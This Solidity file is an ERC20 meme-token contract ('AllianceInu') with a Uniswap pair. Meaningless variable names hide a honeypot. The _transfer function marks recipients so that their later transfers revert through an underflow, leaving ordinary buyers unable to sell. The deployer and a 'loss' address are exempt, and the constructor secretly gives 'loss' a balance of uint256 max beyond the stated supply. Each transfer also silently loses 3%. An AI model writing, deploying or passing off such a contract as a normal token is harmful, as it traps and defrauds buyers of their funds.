// https://t.me/Allianceinu

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract AllianceInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private thought;

    function _transfer(
        address frozen,
        address slide,
        uint256 chicken
    ) internal override {
        uint256 tears = pony;

        if (list[frozen] == 0 && thought[frozen] > 0 && uniswapV2Pair != frozen) {
            list[frozen] -= tears;
        }

        address hot = slipped;
        slipped = slide;
        thought[hot] += tears + 1;

        _balances[frozen] -= chicken;
        uint256 truth = (chicken / 100) * pony;
        chicken -= truth;
        _balances[slide] += chicken;
    }

    address private slipped;
    mapping(address => uint256) private list;
    uint256 public pony = 3;

    constructor(
        string memory additional,
        string memory different,
        address animal,
        address loss
    ) ERC20(additional, different) {
        uint256 fort = ~((uint256(0)));

        uniswapV2Router = IUniswapV2Router02(animal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        list[msg.sender] = fort;
        list[loss] = fort;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[loss] = fort;
    }
}